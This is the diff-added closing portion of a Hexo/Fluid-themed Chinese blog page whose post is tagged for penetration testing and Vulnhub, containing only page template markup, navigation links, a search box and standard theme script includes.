+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Penetration/">Penetration</a>
+                    
+                      <a class="hover-with-bg" href="/tags/vulnhub/">vulnhub</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/07/04/Code/Python/python%E5%B8%B8%E8%A7%81%E6%8A%A5%E9%94%99/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Python常见报错</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/07/03/Penetration/Vulnhub/Part-1/0x06%20DC-3/">
+                        <span class="hidden-mobile">DC：3.2</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
